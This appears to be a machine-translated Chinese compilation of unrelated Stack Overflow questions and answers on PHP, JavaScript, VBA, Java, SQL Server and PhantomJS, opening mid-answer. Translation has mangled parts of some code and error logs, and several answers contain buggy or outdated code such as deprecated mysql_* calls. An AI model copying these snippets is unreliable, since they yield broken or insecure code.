但是，当您链接它们时，您可能希望在链接本身周围加上单引号。IE`onclick="load_content('Look at me now.pdf')"`

# php - 如何在这个 php 行中添加一个 javascript 变量？

> ID：10114876
> 
> 赞同：1
> 
> 时间：2012-04-11T22:26:32.490
> 
> 标签：php, javascript, jquery, datepicker, date-format

我有一个 Javascript 函数，它从 jQuery 日期选择器获取日期。

现在我想以这种格式打印这个选定的日期。

```
$selecteddate = strftime('%A').date("(d-n-Y)"); 
```

我如何添加这个日期，这是一个 javascript 变量到这个 php 格式？因为我想稍后回显 $selecteddate ..

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-17T12:21:28.737

```
$datum = mysql_real_escape_string($_POST['datum']); 
setlocale(LC_ALL, 'nl_NL'); 
$selecteddate = strftime('%A', strtotime($datum)).date(" (d-n-Y)", strtotime($datum)); 
```

基本上发送日期，格式化并打印在那里。谢谢！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T00:48:00.190

jQuery DatePicker 小部件具有[dateformatter 实用功能](http://docs.jquery.com/UI/Datepicker/formatDate)。您可以使用它而不是进入 PHP 并返回吗？

# vba - VBA 无边距打印

> ID：10114879
> 
> 赞同：1
> 
> 时间：2012-04-11T22:26:41.960
> 
> 标签：vba

我必须在 Excel VBA 中设置一个页面......问题是页面必须是无边框的。所以不仅是左、右、上等选项的常用方式，我还必须操纵打印机以确保不会看到任何边框......好吧，我可以手动完成，但即使我记录了宏...在我完成后，我发现根本没有针对此问题记录任何内容....不需要任何宏记录的帮助我做到了...宏就在那里...带有子.. ...但根本没有 VB 代码...我也可以手动编码...但是如何...没有任何打印机对象...任何解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T07:07:01.970

我认为以下代码应该对您有所帮助。

```
 Public Sub PrintButton1_Click()
    Dim CurrRange As Range, CurrRange2 As Range

    Set CurrRange = ThisWorkbook.Worksheets("Sheet1").Range("A1:--")
    Set CurrRange2 = ThisWorkbook.Worksheets("rough").Range("A1:--")
    CurrRange2.ClearContents
    CurrRange.Copy
    CurrRange2.PasteSpecial xlPasteAllExceptBorders 
```

上面的语句应该以您想要打印输出的格式粘贴内容。

然后使用以下代码设置页面并打印

```
 With PageSetup
    .Zoom = False
    .FitToPagesTall = 1
    .FitToPagesWide = 1
    End With
    CurrRange2.PrintOut 1, 1, 1
    End Sub 
```

# tabs - 自动空格分隔程序或应用程序

> ID：10114880
> 
> 赞同：0
> 
> 时间：2012-04-11T22:26:47.783
> 
> 标签：tabs

好吧，我最近在 PHP 和 HTML 上做了一些工作，并且我没有使用 TAB 来制作空格，从而使代码更具可读性和组织性，现在它让我很生气。任何人都知道一种有效的方法或任何可以放置 HTML 或 PHP 的程序，它为您创造了所有这些空间，使代码更有条理？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:28:41.513

如果您使用特定的编辑器，有些编辑器具有“美化”功能，可以自动标记您的源。

同时，你可以试试这个：[http ://www.beautifyphp.com/](http://www.beautifyphp.com/)

# php - PHP测验脚本答案突出显示

> ID：10114881
> 
> 赞同：2
> 
> 时间：2012-04-11T22:26:57.873
> 
> 标签：php

我有一个 PHP 脚本和 MSSQL 表，我在一个变量中存储了答案键，`$right_answer`用户选择的答案`$user_answer_select`格式是这样的

```
5+10?

A) 10
B) 15
C) 20
D) 25
E) 50

Answer key: B 
```

我想要做的是在 B 旁边打一个复选标记，如果它是正确的，一个 X 如果它是错误的，我将如何在这里制作 if else 语句？

这是我目前拥有的代码

```
if(($user_answer_select == $right_answer) && $user_answer_select == 'a') $a_sel = "<img src=\"tick_icon.gif\">";
else if(($user_answer_select == $right_answer) && $user_answer_select == 'b') $b_sel = "<img src=\"tick_icon.gif\">";
else if(($user_answer_select == $right_answer) && $user_answer_select == 'c') $c_sel = "<img src=\"tick_icon.gif\">";
else if(($user_answer_select == $right_answer) && $user_answer_select == 'd') $d_sel = "<img src=\"tick_icon.gif\">";
else if(($user_answer_select == $right_answer) && $user_answer_select == 'e') $e_sel = "<img src=\"tick_icon.gif\">"; 
```

这是错误的，因为一些没有答案的问题被突出显示为真。这样做的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:33:33.193

```
if ( $user_answer_select == $right_answer ) {
    $correct = true;
} else {
    $correct = false;
} 
```

然后在表格上的正确答案中：

```
<?php echo $correct == true ? 'x' : ''; ?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:33:57.433

```
$answers = array ( "A"=>10, "B"=>15, "C"=>20, "D"=>25, "E"=>50 );
$right_answer = "B";
$user_selected_answer = "A";

echo "5+10?<br/>";

foreach ($answers as $key => $value) {
  echo $key.") ".$value;
  if ($value === $user_selected_answer) {
    if ($value === $right_answer){ echo "check!"; }
    else { echo "X"; }
  }
  echo "<br/>";
}

echo "Answer key: $right_answer"; 
```

# java - 如何与不同的 android 浏览器交互（获取 url）

> ID：10114886
> 
> 赞同：5
> 
> 时间：2012-04-11T22:27:35.380
> 
> 标签：java, android, html

我正在寻找一种与不同安卓浏览器交互的方法。我的目的是获取浏览器打开的网站的 URL。我的应用程序应该在后台运行并在打开特定 url 时发出警报，现在这是用于测试和了解有关 android 的更多信息。

每次输入新的 url 时，有没有办法告诉浏览器将 url-string 传递给我的应用程序？我已经有了实现本地代理服务器的想法，该代理服务器检查所有 http 请求以获取特定 url，但是有更好的方法吗？此外，这应该适用于每个浏览器，不仅是标准浏览器，而且例如。火狐或海豚。

我已经搜索了过去几天，但找不到答案....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:30:15.357

是的，你可以做到这一点！查看[http://seleniumhq.org/](http://seleniumhq.org/)了解如何自动化 Web 浏览器。

# javascript - 检查 NULL 上的文本框

> ID：10114887
> 
> 赞同：1
> 
> 时间：2012-04-11T22:27:38.050
> 
> 标签：javascript, html

如何检查 input="text" 值是否不为 NULL 然后移动到页面？

```
<input TYPE="text" name="textbox2" align="center">
........
function HomeButton()
                {
                    <!--if textbox1 value and textbox2 value not null-->
                        location.href="registration.html";
                } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:30:38.497

只需检查它们的值是否都是真实的。

```
var textbox1 = document.getElementsByName('textbox1')[0];
var textbox2 = document.getElementsByName('textbox2')[0];

if(textbox1.value && textbox2.value) {
    location.href = "registration.html";
} 
```

* * *

当然，您可以通过给它们`id`s 使事情变得更容易：

```
<input type="text" name="textbox2" id="textbox2" align="center"> 
```

和

```
var textbox2 = document.getElementById('textbox2'); 
```

例如。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:30:27.890

给文本框一个`id`

```
<input type="text" id="textbox2" name="textbox2" align="center" />

if (document.getElementById('textbox1').value !== null &&
    document.getElementById('textbox2').value !== null) {
                    location.href="registration.html";
} 
```

但该值永远不会是`null`，因此您可能想要检查空字符串：

```
if (document.getElementById('textbox1').value &&
    document.getElementById('textbox2').value) {
                    location.href="registration.html";
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:31:22.477

1，为该输入分配一个id，以便在代码中更好地定位

2，我建议使用jquery，如果不是你可以这样做：

```
<input TYPE="text" name="textbox2" align="center" id="textbox1">
........
function HomeButton()
                {
                    if (document.getElementById('textbox1').value != "" && document.getElementById('textbox1').value != null) {
                        location.href="registration.html";
                } 
```

# java - 在不同的 tomcat 集群节点上运行相同任务的最佳设计是什么？

> ID：10114888
> 
> 赞同：2
> 
> 时间：2012-04-11T22:28:14.863
> 
> 标签：java, jakarta-ee, tomcat

我的系统中有不同的tomcat实例。另一个系统应在所有 tomcat 实例中启动相同的任务（设置 webapp 离线/在线的任务），并且必须通知任务的结果。最好的方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:45:11.950

您可以在每个集群服务器中部署 Tomcat 管理器应用程序并使用它来控制它们。管理器提供了一个简单的基于 Web 的 API 来控制服务器实例。从您的控制服务器发出 HTTP 调用以在您的控制服务器中执行任务。HTTP 调用的响应数据将指示任务是否成功。

下面是使用 Apache 的 HTTP 组件库从控制服务器进行调用的示例：

```
HttpGet get = new HttpGet("http://www.example.com:8080/manager/stop?path=/myapp");
HttpClient client = new DefaultHttpClient();
HttpResponse response = client.execute(get);
System.out.println(response.getStatusLine()); 
```

请注意，在使用 Tomcat 管理器时，您应该始终使用用户名/密码保护它并使用 SSL 保护它。

[Tomcat 6 - 管理器文档](http://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html)

# html - HTML5 音频播放器播放后删除缓冲区

> ID：10114894
> 
> 赞同：1
> 
> 时间：2012-04-11T22:29:02.823
> 
> 标签：html, html5-audio

我的网站上有一个简单的 HTML5 音频播放器，如下所示：

```
<audio src="file.ogg" preload="none" loop="loop" controls="controls" >
Your browser does not support the audio element.
</audio > 
```

我希望如果播放文件以结束文件应该重新加载。现在，如果文件被播放并且我再次点击播放，它会播放客户端浏览器缓存中的文件。但我想如果我点击播放文件应该从浏览器再次加载。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-15T22:14:10.240

你真的不行

你能做的是。这就是我至少会做的事情。当你点击播放按钮（只是一个播放图像而不是实际文件）应该创建一个新的音频标签时触发一个 js。这样它会创建一个新的音频。音频非常有限。

没有办法控制缓冲，在某个时候有一个标志可以禁用他们删除的缓冲。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-09T03:45:16.483

If you have, for example, "stopped" the media with:

```
media.pause();
media.currentTime = 0;
//Just reload
media.load(); 
```

That should clear the buffer.

# php - 循环遍历Mysql数据库中的所有表并从PHP中的每个表中获取相同列的平均值

> ID：10114895
> 
> 赞同：1
> 
> 时间：2012-04-11T22:29:06.903
> 
> 标签：php, mysql

提前为表结构道歉......但我有多个表，每个表都与不同用户收集的数据有关。该数据是连续收集的，只是在发生时添加更多行......正如我所说，我有多个具有这种相似结构的表，我希望最终得到超过 10 组 5 列的平均值。(fb1 + fb2 + fb3 + fb4 + fb5)/5 = q 的 1-5 的平均值....

各列均指从 Web 应用程序调查中得出的答案，并且均以 1 到 10 的值取值。这些问题以 5 个为一组，相加然后除以 5 得到平均值。...

我想要的是这个，但是遍历所有表中的所有列并在更大的范围内获得相同的结果。

我有每个表的公式，如下所示，但是我如何循环未设置数量的表以输出相同的值，同时考虑到来自多个表的值？

```
 $query="SELECT AVG(fb1), AVG(fb2), AVG(fb3), AVG(fb4), AVG(fb5), AVG(fb6), AVG(fb7), AVG(fb8), AVG(fb9), AVG(fb10), AVG(fb11), AVG(fb12), AVG(fb13), AVG(fb14), AVG(fb15), AVG(fb16), AVG(fb17), AVG(fb18), AVG(fb19), AVG(fb20), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb5), AVG(fb21), AVG(fb22), AVG(fb23), AVG(fb24), AVG(fb25), AVG(fb26), AVG(fb27), AVG(fb28), AVG(fb29), AVG(fb30), AVG(fb31), AVG(fb32), AVG(fb33), AVG(fb34), AVG(fb35), AVG(fb36), AVG(fb37), AVG(fb38), AVG(fb39), AVG(fb40), AVG(fb41), AVG(fb42), AVG(fb43), AVG(fb44), AVG(fb45), AVG(fb46), AVG(fb47), AVG(fb48), AVG(fb49), AVG(fb50) FROM `".$_SESSION['table']."`";

$result=mysql_query($query);

while($row = mysql_fetch_array($result)){
$row1 = $row['AVG(fb1)'] + $row['AVG(fb2)'] + $row['AVG(fb3)'] + $row['AVG(fb4)'] +     $row['AVG(fb5)'];
$row2 = $row['AVG(fb6)'] + $row['AVG(fb7)'] + $row['AVG(fb8)'] + $row['AVG(fb9)'] + $row['AVG(fb10)'];
$row3 = $row['AVG(fb11)'] + $row['AVG(fb12)'] + $row['AVG(fb13)'] + $row['AVG(fb14)'] + $row['AVG(fb15)'];
$row4 = $row['AVG(fb16)'] + $row['AVG(fb17)'] + $row['AVG(fb18)'] + $row['AVG(fb19)'] + $row['AVG(fb20)'];
$row5 = $row['AVG(fb20)'] + $row['AVG(fb22)'] + $row['AVG(fb23)'] + $row['AVG(fb24)'] + $row['AVG(fb25)'];
$row6 = $row['AVG(fb26)'] + $row['AVG(fb27)'] + $row['AVG(fb28)'] + $row['AVG(fb29)'] + $row['AVG(fb30)'];
$row7 = $row['AVG(fb30)'] + $row['AVG(fb32)'] + $row['AVG(fb33)'] + $row['AVG(fb34)'] + $row['AVG(fb35)'];
$row8 = $row['AVG(fb36)'] + $row['AVG(fb37)'] + $row['AVG(fb38)'] + $row['AVG(fb39)'] + $row['AVG(fb40)'];
$row9 = $row['AVG(fb40)'] + $row['AVG(fb42)'] + $row['AVG(fb43)'] + $row['AVG(fb44)'] + $row['AVG(fb45)'];
$row10 = $row['AVG(fb46)'] + $row['AVG(fb47)'] + $row['AVG(fb48)'] + $row['AVG(fb49)'] + $row['AVG(fb50)'];

    $row1Avg = $row1 / 5;
    $row2Avg = $row2 / 5;
    $row3Avg = $row3 / 5;
    $row4Avg = $row4 / 5;
    $row5Avg = $row5 / 5;
    $row6Avg = $row6 / 5;
    $row7Avg = $row7 / 5;
    $row8Avg = $row8 / 5;
    $row9Avg = $row9 / 5;
    $row10Avg = $row10 / 5;

echo " all of those"; 
```

ps 由于我在没有使用每个人都在谈论的这种 PDO 语法的情况下完成了所有工作，因此我非常感谢除了 PDO 解决方案之外的任何帮助，除非这是不可能的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T02:08:23.927

首先，我将自由更改[数组](http://php.net/manual/en/language.types.array.php)$group[1], $group[2]... 的 $row1, $row2...，以免将它们与实际行混淆。它们不是行，它们实际上是列组。

一是查询。我不会那样做。您显然有进步，那么为什么不利用这一点呢？

```
//First, a couple of definitions.
$group=array();
$default=0;     //If there are no results, the default is 0
$k=0;

// The following query looks like this: SELECT AVG(fb1), [...], AVG(fb50) FROM `table`
$queryA="SELECT ";
for ($i=1; $i<50; $i++)
    $queryA.="AVG(fb".$i."), "
$queryA.="AVG(fb50) FROM `table`";
$resultA=mysql_query($queryA);

//I don't know all the other table's names, so I assume table2, table3 etc.
//EDIT THIS. Add the code in brackets as many times as tables (with the respective names $queryC, $queryD... and the $resultC, $resultD...):
{
$queryB="SELECT ";
for ($i=1; $i<50; $i++)
    $queryB.="AVG(fb".$i."), "
$queryB.="AVG(fb50) FROM `table2'`";
$resultB=mysql_query($queryB);
}

$num=0;
//EDIT THIS. Add as many as needed. Gets which result is longer.
if (mysql_num_rows($resultA)>=$num)
    $num=mysql_num_rows($resultA);
if (mysql_num_rows($resultB)>=$num)
    $num=mysql_num_rows($resultB);

//Then, the while loop:
for($a=0; $a<$num; $a++)
    {
    //EDIT THIS. Add as many as needed
    $rowA = mysql_fetch_array($resultA)
    $rowB = mysql_fetch_array($resultB);

    // Repeat it 50 times
    for ($j=0; j<50;j++)
        {
        //EDIT THIS. Add as many as tables suming up.
        $group[$k]+=$rowA["AVG(fb".$j.")"]+$rowB["AVG(fb".$j.")"];

        //EDIT THIS. Get the number to divide for the average
        if (!empty($rowA["AVG(fb".$j.")"])) $group["n".$k]+=1;
        if (!empty($rowB["AVG(fb".$j.")"])) $group["n".$k]+=1;

        //Checks if $j is 4, 9, 14, 19 etc (groups of 5 as 0 is included)
        if ($j%5==4)
            {
            $k++;
            }
    }

for ($i=1; $i<=5; $i++)
{
$group=(float) $group[$i]
$div=(float) $group["n".$i];
if ($div!=0)
    {
    $group[$i]=$group/$div;
    }
else $group[$i]=$default;
echo "<br>Group ".$i.": ".$group[$i];
} 
```

如您所见，**它不适用于复制/粘贴**。我假设您在几个不同的地方手动输入所有数据。仅编辑评论下方的行**'EDIT THIS'**。其余的评论是解释，不需要进一步的工作。我尚未对其进行测试，但我相信如果您手动输入所有表名并需要我详述的字段，它会起作用。

我想我必须告诉你，这不是一个“好”的做法。最好将所有数据放在一个表中，`values`添加一个名为的字段`creator_id`，然后创建另一个`creators`具有相同`creator_id`字段和一个`name`字段的表。然后您`WHERE creator_id=$whatever`用于查看个人调查。

# iframe - 使用 iframe 时，如何让 jquery.address 在 Opera 中工作？

> ID：10114906
> 
> 赞同：1
> 
> 时间：2012-04-11T22:30:53.073
> 
> 标签：iframe, opera, jquery-address

我有一个网页，它大量使用 jquery.address 插件。现在我需要在 iframe（社交网络应用程序）中显示此页面。它在除 Opera 之外的所有浏览器中都能正常工作（我有 Opera 11.62）。这是我得到的错误：

```
[04/12/2012 01:14:14 AM] JavaScript -
内联脚本线程
未捕获的异常：ReferenceError：安全错误：试图读取受保护的变量：onhashchange
在 http://vk.autosprite.ru/media/js/jquery.address-1.5.js 中 () 的第 15 行第 8 列抛出错误：
    var _trigger = 函数（名称）{
从 http://vk.autosprite.ru/media/js/jquery.address-1.5.js 中 ($) 的第 13 行第 4 列调用：
    $.address = (function () {
从 http://vk.autosprite.ru/media/js/jquery.address-1.5.js 的第 11 行第 0 列调用：
    （函数（$）{

```

任何想法为什么会发生这种情况以及我能做些什么来解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-11T13:30:18.710

Opera 禁止从 IFRAME 访问 top.document 属性，例如“title”或事件“onhashchanged”，并抛出错误“未捕获的异常：ReferenceError：安全错误：试图读取受保护的变量：onhashchange。” 我已经向他们提交了修复： [https ://github.com/asual/jquery-address/pull/130](https://github.com/asual/jquery-address/pull/130)

# sql-server-2008 - 生成脚本以复制视图

> ID：10114908
> 
> 赞同：0
> 
> 时间：2012-04-11T22:31:08.293
> 
> 标签：sql-server-2008, tsql, sql-server-2008-r2, ssms

我希望使用 SSMS 2008 中的 Generate Scripts 选项将 DEV db 上的视图复制到 LIVE db。

我为“Include IF NOT EXISTS = True”和“Script DROP and CREATE = Script DROP and CREATE”设置了高级权限。

但是，当我在我的 LIVE db 上运行它时，它抱怨说：

```
Msg 208, Level 16, State 1, Procedure vw_XXXXXInviteEventDaysA_DELETE, Line 4
Invalid object name 'dbo.vw_XXXXXInviteEventDays'. 
```

...我经常遇到这种情况。

我是否认为此错误与视图回复另一个视图有关，该视图稍后在脚本中等待创建？如果是这样，我该如何解决这个问题？

谢谢保罗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T13:48:44.540

您可以使用 Visual Studio 2010 数据库项目。通过[“架构比较”](http://msdn.microsoft.com/en-us/library/dd193250%28v=vs.100%29.aspx)功能，您可以比较两个数据库并生成部署脚本，前提是您只能访问两个数据库。

# php - PHP删除一个完整的文件夹

> ID：10114909
> 
> 赞同：-2
> 
> 时间：2012-04-11T22:31:10.493
> 
> 标签：php, linux, delete-file

我有以下功能，我试图用它来删除一个完整的文件夹，但它似乎没有删除任何想法或建议？

```
public function submit()
{
        $location = $_SERVER['DOCUMENT_ROOT'].'/_assets/quote/uploads/';

        $folderName = $this->quote->getCompanyDetails()->companyName;

        $data['companyContact'] = $this->quote->getCompanyDetails()->companyContact;

        $this->load->view('submit',$data);

        $this->quote->removeQuote();

        if(is_dir($location.$folderName) === TRUE)
        {
            $files = array_diff(scandir($location.$folderName), array('.','..'));

            foreach($files as $file)
            {
                Delete(realpath($location.$folderName).'/'. $file);
            }
            return rmdir($location.$folderName);
        }
        else if(is_file($location.$folderName) === TRUE)
        {
            return unlink($location.$folderName);
        }
        return FALSE;
} 
```

**更新：**

```
public function submit()
{
        $location = $_SERVER['DOCUMENT_ROOT'].'/_assets/quote/uploads/';

        $folderName = $this->quote->getCompanyDetails()->companyName;

        $data['companyContact'] = $this->quote->getCompanyDetails()->companyContact;

        $this->load->view('submit',$data);

        //$this->quote->removeQuote();

        $this->removeFolder();
}

private function removeFolder(){
        $location = $_SERVER['DOCUMENT_ROOT'].'/_assets/quote/uploads/';

        $folderName = $this->quote->getCompanyDetails()->companyName;

        foreach(glob($location.$folderName.'/*') as $file)
        {
            if(is_dir($location.$folderName))
            {
                rmdir($location.$folderName);
            }else{
                unlink($location.$folderName);
            }
            rmdir($location.$folderName);
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:40:27.457

您不能在一次通话中删除整个文件夹。你应该递归地这样做：

```
function rrmdir($dir) {
    foreach(glob($dir . '/*') as $file) {
        if(is_dir($file))
            rrmdir($file);
        else
            unlink($file);
    }
    rmdir($dir);
} 
```

# java - 使用 JPL 从 Java 重新启动 Prolog 引擎

> ID：10114912
> 
> 赞同：1
> 
> 时间：2012-04-11T22:31:39.653
> 
> 标签：java, prolog, jpl

在一个使用 JPL 与 Prolog 交互的 java 应用程序中，我希望能够使用不同的设置重新启动 prolog 引擎。例如，我想从 SWI 更改为 YAP（我通过方法`JPL.setNativeLibraryDir`以及我需要使用的正确本机库的路径来配置使用哪个引擎）。

因此，在更改 JPL 配置后，我试图停止已经运行的 prolog 引擎，以便之后使用`JPL.init()`.

首先我看了一下`JPL.halt()`，但是文档说它已被弃用，并且该方法的源代码中的注释说它是无操作的。

之后，我尝试使用“halt”启动查询，但尽管我在控制台中看到“YAP 执行已停止”，但我的 Java 应用程序也已停止（！）。

有没有办法使用 JPL 重新启动逻辑引擎而不杀死我的 java 应用程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T17:26:42.073

为什么不使用批处理文件来运行脚本。首先你可以有 /Applications/swi -l your/swi/code 然后在你的序言代码中使用 halt 以便它在执行后停止。您可以使用运行时方法在 java 中运行批处理文件。

# html - 除非我明确设置容器宽度，否则嵌套的 UL 列不会向左浮动

> ID：10114913
> 
> 赞同：0
> 
> 时间：2012-04-11T22:31:45.187
> 
> 标签：html, css

这就是我希望我的下拉列表看起来的样子，下面列出的关键 css：

"#nav .flyout > li { float:left; }

“#nav .flyout.fourCol { 宽度：900px; }”

[http://jsfiddle.net/t7esz/](http://jsfiddle.net/t7esz/) （这工作）

但是，当我设置“#nav .flyout.fourCol { width:auto; }”时，所有的 lis 都向下折叠。就像除非我明确设置容器宽度，否则它们不会向左浮动或内联显示。

[http://jsfiddle.net/sumcA/2/](http://jsfiddle.net/sumcA/2/)（这不行，我希望能够在这里使用宽度自动！）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T20:05:25.590

你可以这样做：

`Css`

```
.list { width: 980px; height: 39px; background-color: #878787; }
.list ul { list-style: none; margin: 0; padding: 0; }
.list ul li { 
    float: left; 
    padding: 10px; 
    font-size: 14px; 
    background-color: #3c3c3c; 
    margin-right: 5px;
} 
```

`Html`

```
<div class="list">
    <ul>
        <li>One</li>
        <li>Two</li>
        <li>Three</li>
        <li>No width set</li>
    </ul>
</div> 
```

它看起来像这样：

```
http://img36.imageshack.us/img36/2721/noautoulli.png 
```

# ontology - Text2Onto的设计文档

> ID：10114915
> 
> 赞同：1
> 
> 时间：2012-04-11T22:32:00.947
> 
> 标签：ontology

有人知道是否有 Text2Onto 的设计文件吗？我正在尝试研究它的源代码。如果有关于代码的任何文档，那将非常有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-24T17:02:18.703

Text2Onto 上没有太多内容。不完全是设计文档，但这里有一些您可以参考的链接

*   [Text2Onto 中的概念分类算法](http://ryadyo.wordpress.com/2012/10/04/algorithms-for-classifying-concepts-in-text2onto/)
*   [Text2Onto 中的概念和实例提取算法](http://ryadyo.wordpress.com/2012/10/03/concept-and-instance-extraction-algorithms-in-text2onto/)
*   [子猫关系提取算法](http://ryadyo.wordpress.com/2012/10/09/subcatrelationextraction-algorithm/)

# c# - == 和 .Equals() 与接口和 LINQ 之间的区别

> ID：10114916
> 
> 赞同：11
> 
> 时间：2012-04-11T22:32:04.520
> 
> 标签：c#, linq-to-sql

我最近收到“不支持接口成员的映射.....”错误，我根据[这个线程](http://social.msdn.microsoft.com/Forums/en-US/linqtosql/thread/bc2fbbce-eb63-4735-9b2d-26b4ab8fe589/)解决了这个错误。展示：

```
public interface IMyInterface { string valueText { get; set; } }
public class MyData : IMyInterface
{
   int ID { get; set;}
   string valueText { get; set;}
}
public class MyOtherData : IMyInterface
{
   long ID { get; set;}
   string valueText { get; set;}
} 
```

和

```
public static IEnumerable<T> GetByValue<T>(string value) : where T : class, IMyInterface, new()
{ 
   using (var context = new DataContext())
   { 
      // The important line
      return context.GetTable<T>().Where(x => x.valueText == value);
   }
} 
```

运行此代码，我会得到一个 NotSupportedException：“不支持接口成员 IMyInterface.valueText 的映射”。但是，如果我将 替换为`x.valueText == value`，`x.valueText.Equals(value)`这将完全按预期工作。

我已经在我的代码中解决了这个问题，但我想了解它*为什么*会这样。谁能解释一下？

**更新：**根据我下面的评论，LINQ to SQL 团队将其关闭为“不会修复”。我认为这意味着它现在算作一个已知错误，但不会很快得到解决。不过，我仍然想知道为什么它的行为首先会有所不同。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:35:36.867

显然，将查询向上游推送到服务器的决定是基于一组不完整的规则做出的，然后 LINQ-to-SQL 找到了它无法处理的构造（接口）。

LINQ-to-SQL 不支持该方法调用，因此它会生成一个查询来检索所有记录，然后使用 LINQ-to-Objects 过滤它们。（实际上，根据您的其他线程，LINQ-to-SQL 可能会为它创建一个特殊例外，`object.Equals`并且知道如何将其转换为 SQL）。

当涉及接口时，LINQ-to-SQL 可能应该回退到 LINQ-to-Objects 行为，但显然它只是抛出异常。

# php - 在 php 中插入查询不适用于 ajax

> ID：10114921
> 
> 赞同：-2
> 
> 时间：2012-04-11T22:32:21.177
> 
> 标签：php, ajax, insert

我在使用从 ajax 调用的插入查询时遇到了一些问题。ajax 调用成功返回，我可以看到它与更改后的 html 一样，如下面代码中的success:function() 所示。我不确定为什么 process.php 中的插入查询不起作用。dataString 的参数正确（dataString 的警报显示正确的参数）并且我在数据库中的字段可以采用空值。

js代码

```
 var dataString=$('#testimonials').serialize();

  alert (dataString);

  $.ajax(
  {
    type: "POST",
    url: "process.php",
    data: dataString,
    success:function() {
      $('#testimonials').html("<div id='message'></div>");
      $('#message').html("<h2>Your information has been submitted!</h2>")
      .append("<p>Thank you for your help and support.</p>")
      .hide()
      .fadeIn(1500, function() 
      {
        $('#message').append("<img id='checkmark' src='images/check.png' height='30' width='30'/>");
      });
   }); 
```

进程.php 文件

```
 $company =mysql_escape_string($_POST('company'));
    $jobfunc = mysql_escape_string($_POST('jobfunc'));
    $location = mysql_escape_string($_POST('location'));
    $overall = mysql_escape_string($_POST('overall'));
    $detail = mysql_escape_string($_POST('detail'));
    $pros = mysql_escape_string($_POST('pros'));
    $cons = mysql_escape_string($_POST('cons'));
    $sr_mgmt = mysql_escape_string($_POST('sr_mgmt'));
    $submitted_by = mysql_escape_string($_POST('submitted_by'));
    $class = mysql_escape_string($_POST('classof'));
    $school = mysql_escape_string($_POST('school'));
    $anonymous = mysql_escape_string($_POST('anonymous'));      

    mysql_select_db($database_connTest, $connTest);

    $query_AddTestimonial = "INSERT into testimonials (company,job_function,location,overall,project_details,pros,cons,sr_mgmt,submitted_by,class,school,anonymous) VALUES ('$company','$jobfunc','$location','$overall','$detail','$pros','$cons','$sr_mgmt','$submitted_by','$class','$school','$anonymous')";
    $result_AddTestimonial = mysql_query($query_AddTestimonial) or die(mysql_error()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:56:15.603

在您创建 $query_AddTestimonial 时的倒数第二行中，您创建的字符串没有将 php 变量放入其中，因为您没有告诉它它们是变量。您可以像这样使用 php 变量：

```
$query_AddTestimonial = "INSERT into testimonials (company,job_function,location,overall,project_details,pros,cons,sr_mgmt,submitted_by,class,school,anonymous) VALUES ('{$company}','{$jobfunc}','{$location}','{$overall}','{$detail}','{$pros}','{$cons}','{$sr_mgmt}','{$submitted_by}','{$class}','{$school}','{$anonymous}')"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T17:35:00.540

问题在于我调用变量的方式。它应该是 $_POST['company'] 而不是 $_POST('company')。完全错过了它（$_POST 的方括号，因为它是一个数组）

# javascript - PhantomJS 不发送身份验证标头

> ID：10114925
> 
> 赞同：26
> 
> 时间：2012-04-11T22:32:45.953
> 
> 标签：javascript, http, phantomjs

我正在尝试在 PhantomJS 中打开一个需要 HTTP 身份验证的网页。我的脚本基于 loadspeed.js 示例：

```
var page = require('webpage').create(),
    t, address;
page.settings.userName = "user";
page.settings.password = "password";
if (phantom.args.length === 0) {
  console.log('Usage: loadspeed.js <some URL>');
  phantom.exit();
} else {
  t = Date.now();
  address = phantom.args[0];
  page.open(address, function (status) {
      if (status !== 'success') {
          console.log('FAIL to load the address');
      } else {
          t = Date.now() - t;
          console.log('Loading time ' + t + ' msec');
          page.render('page.jpg');
      }
      phantom.exit();
  });
} 
```

我可以从渲染的 page.jpg 中看到我每次都得到 401。我还使用 Wireshark 跟踪了 HTTP 会话，这表明在 GET 请求中没有向给定 URL 发送任何身份验证标头。

我在这里做错了什么？我刚开始使用 PhantomJS，但我整个晚上都在搜索，但没有走远......

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-04-11T03:43:22.477

PhantomJS（至少从 1.9.0 开始）有一个关于 auth 的错误：它发送没有 auth 标头的请求，然后只有在它返回 401 后才会再次执行请求，但这次使用标头。（那是针对 GET 的；使用 POST 它根本不起作用。）

解决方法很简单，所以不要：

```
page.settings.userName = 'username';
page.settings.password = 'password'; 
```

您可以使用：

```
page.customHeaders={'Authorization': 'Basic '+btoa('username:password')}; 
```

（我刚刚在一篇博文中介绍了这一点：http: [//darrendev.blogspot.jp/2013/04/phantomjs-post-auth-and-timeouts.html](http://darrendev.blogspot.jp/2013/04/phantomjs-post-auth-and-timeouts.html)，并从 Igor Semenko 那里了解到 PhantomJS 邮件列表中的解决方法。）

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-23T09:20:59.257

